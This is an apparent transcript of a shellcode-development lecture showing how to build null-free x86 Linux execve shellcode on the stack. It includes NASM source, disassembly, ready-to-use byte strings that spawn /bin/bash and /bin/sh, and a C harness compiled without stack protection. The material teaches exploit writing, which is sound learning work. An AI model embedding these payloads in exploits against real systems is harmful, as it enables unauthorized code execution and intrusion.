#Execve Shellcode Stack Technique

Hello students! In this video we will look at how to rewrite the execve
shellcode using the stack method.

So let's jump to our setup. Let me actually copy our `execve.nasm` into
`execve-stack.nasm`. Let's open it up and stay only a skeleton.

```
global _start

section .text
_start:

```

Now, remind yourself of the stack method which I demo to you for 
HelloWorld shellcode. 

Now, there are bunch of things which we should probably remember from
the previous video. If you remember the `ebx` register would need to
point to `/bin/bash`, the `ecx` register would need to point to `argv`
and the `edx` register would need to point to `envp`.

Now, I am trying to create exact the same setup using the stack, the
key difference will be rather than pushing them in specific order
as you currently see. I am going to push them in different order and
then point the appropriate registers in such a way that conditions
taken in previous video about `ebx` pointing to `/bin/bash`, `ecx`
pointing to `argv` (the address of `/bin/bash,0x00000000`), and `edx` 
pointing to `envp` is valid.

So stack as we know grows from high memory to low memory. The first
thing we are going to push on the stack is a dword `0x00000000`. Let
me go ahead and write the code

```
global _start

section .text
_start:

        xor eax, eax
        push eax
```

Now the next thing I want to push is basically the string `/bin/bash`
on the stack.

Now if you look at `/bin/bash` this is basically 9 characters. If you
remember we typically want `push` to be aligned by 4. There are 
multiple ways of course in which you can just put in 9 and then you can
figure out other instructions with which you can ensure that everything
works. This is where a command trick is used by shellcoders which is
wherenever you run a program by giving its path the number of slashes
there does not really matter. What do I mean by that? Well, you
could invoke `/bin/bash` like this

```
$ /bin/bash
```

or you could add an extra slash

```
$ /bin//bash
```

as you may add any as you like

```
$ /bin///////bash
```

it has the exact same effect as far as interpretation (execution) this
string is conserned. So this is what we are going to use. Rather than
simply using `/bin/bash` I am going to go ahead and add 3 more of them
`////bin/bash` and this is exactly the string which we now want to push
exactly in reverse direction like we've seen in previous videos.

Now, you could use python and all of that stuff 

```
>>> s="////bin/bash"
>>> s[::-1].encode('hex')
'687361622f6e69622f2f2f2f'
```

So let's push these 3 dwords on the stack

```asm
global _start

section .text
_start:

        xor eax, eax
        push eax

        push 0x68736162
        push 0x2f6e6962
        push 0x2f2f2f2f

```

Now, if you notice this is nothing but `/bin/bash` null-terminated
and this `/bin/bash` null-terminated needs to be inside the `ebx`, the
**address** to this location. Now, what is the register which 
currently points to the beginning of `/bin/bash` string is `esp` 
because we are pushing all of these on stack. So to get this inside
`ebx` we use simple `mov ebx, esp`. 

```asm
global _start

section .text
_start:

        xor eax, eax
        push eax

        push 0x68736162
        push 0x2f6e6962
        push 0x2f2f2f2f

        mov ebx, esp
```

Now what we are going to push is another `0x00000000` and if you 
remember `envp` is actually needs to point to a NULL memory and `envp`
needs to be there in `edx` register so we will push a NULL and then
save `esp` into `edx`. So here goes

```asm
global _start

section .text
_start:

        xor eax, eax
        push eax

        push 0x68736162
        push 0x2f6e6962
        push 0x2f2f2f2f

        mov ebx, esp

        push eax
        mov edx, esp
```

Now, what remains is basically `argv` which supposed to point to 
location where we have the address in the first dword and the NULL in
the second dword. So I am going to push the address of 
`/bin/bash,0x00000000` stored on `ebx` on the stack which is very 
simple because it's already stored in `ebx`. So all I do is `push ebx`

```asm
global _start

section .text
_start:

        xor eax, eax
        push eax

        push 0x68736162
        push 0x2f6e6962
        push 0x2f2f2f2f

        mov ebx, esp

        push eax
        mov edx, esp

        push ebx
```

And then once it's done I just move top of the stack on the `ecx` 
register. So

```asm
global _start

section .text
_start:

        xor eax, eax
        push eax

        push 0x68736162
        push 0x2f6e6962
        push 0x2f2f2f2f

        mov ebx, esp

        push eax
        mov edx, esp

        push ebx

        mov ecx, esp
```

There we go. Now, all I need to do after this is call the syscall. So
I have

```asm
global _start

section .text
_start:

        xor eax, eax
        push eax

        push 0x68736162
        push 0x2f6e6962
        push 0x2f2f2f2f

        mov ebx, esp

        push eax
        mov edx, esp

        push ebx

        mov ecx, esp

        mov al, 0xb
        int 0x80
```

Now let's go ahead and assemble and link this

```
$ nasm -f elf32 execve-stack.nasm
$ ld -o execve-stack execve-stack.o
```

let's execute this

```
$ ./execve-stack 
osboxes@osboxes:/home/osboxes/SLAE-Code/Shellcode/Execve$
```

and if you notice the execution is happened. Quick look with `objdump`
so that we ensure there are no NULLs.

```
$ objdump -d execve-stack -M intel

execve-stack:     file format elf32-i386


Disassembly of section .text:

08048060 <_start>:
 8048060:	31 c0                	xor    eax,eax
 8048062:	50                   	push   eax
 8048063:	68 62 61 73 68       	push   0x68736162
 8048068:	68 62 69 6e 2f       	push   0x2f6e6962
 804806d:	68 2f 2f 2f 2f       	push   0x2f2f2f2f
 8048072:	89 e3                	mov    ebx,esp
 8048074:	50                   	push   eax
 8048075:	89 e2                	mov    edx,esp
 8048077:	53                   	push   ebx
 8048078:	89 e1                	mov    ecx,esp
 804807a:	b0 0b                	mov    al,0xb
 804807c:	cd 80                	int    0x80
```

Now we will use my small script

```
$ shellcode-dump.sh execve-stack
"\x31\xc0\x50\x68\x62\x61\x73\x68\x68\x62\x69\x6e\x2f\x68\x2f\x2f\x2f\x2f\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
```

and insert it in `shellcode.c`

```c
#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\x31\xc0\x50\x68\x62\x61\x73\x68\x68\x62\x69\x6e\x2f\x68\x2f\x2f\x2f\x2f\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";

main()
{

        printf("Shellcode Length:  %d\n", strlen(code));

        int (*ret)() = (int(*)())code;

        ret();

}

```

compile

```
gcc -fno-stack-protector -z execstack shellcode.c -o shellcode
```

run the shellcode

```
$ ./shellcode 
Shellcode Length:  30
osboxes@osboxes:/home/osboxes/SLAE-Code/Shellcode/Execve$
```

and there we go. To be honest you could play around with this right
now. So instead if you want it `/bin/sh` all you basically want to
do is replace some `push` instructions.

```
>>> s="/bin//sh"
>>> s[::-1].encode('hex')
'68732f2f6e69622f'
```

So we basically have

```asm
global _start

section .text
_start:

        xor eax, eax
        push eax

;       push 0x68736162
;       push 0x2f6e6962
;       push 0x2f2f2f2f

        push 0x68732f2f
        push 0x6e69622f

        mov ebx, esp

        push eax
        mov edx, esp

        push ebx

        mov ecx, esp

        mov al, 0xb
        int 0x80
```

The best part if you notice everything else is like just taking here
about yourself, there is no dependence really on the size of what we
are pushing.

Ok, let's compile it, fetch shellcode and put it on `shellcode.c`

```
$ nasm -f elf32 execve-stack.nasm
$ ld -o execve-stack execve-stack.o
$ shellcode-dump.sh execve-stack
"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
```

compile `shellcode.c` and run this

```
osboxes@osboxes:~/SLAE-Code/Shellcode/Execve$ ./shellcode 
Shellcode Length:  25
$ 
```

there we go. Now even so people show `/bin/sh` and `/bin/bash` with
shellcode most of the time `execve` pretty much allows you to run 
anything. 

The case with which we are working right now is `execve`
which is calling any other program would not passing any other
arguments because if you remember if you want to pass other arguments
you need to extend `argv`; `argv` will first contain the address of
the program name which you want to execute, then all the argument
addresses and then finally the NULL. So I leave it to you as an 
exercise to give an arguments and things like that It's pretty 
straightforward.

The only thing I want to put in your mind is execute any program you 
like. So let's say you want to do `ls` in the current directory it is
`/bin/ls`. So it's pretty much the same as we did right now.

